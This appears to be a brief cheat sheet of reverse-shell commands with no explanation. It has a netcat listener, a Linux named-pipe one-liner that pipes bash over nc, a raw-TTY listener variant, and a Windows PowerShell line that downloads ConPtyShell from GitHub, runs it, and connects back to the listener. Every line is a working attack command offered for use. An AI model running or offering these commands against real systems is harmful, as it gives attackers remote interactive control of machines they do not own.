# listen ip addresses only verbose port
nc -lnvp 88

# on target linux
mknod /tmp/backpipe p
/bin/bash 0</tmp/backpipe | nc localhost 88 1>/tmp/backpipe

# listen prefix
stty raw -echo; (stty size; cat) | nc -lnvp 88

# on target windows
IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell localhost 88
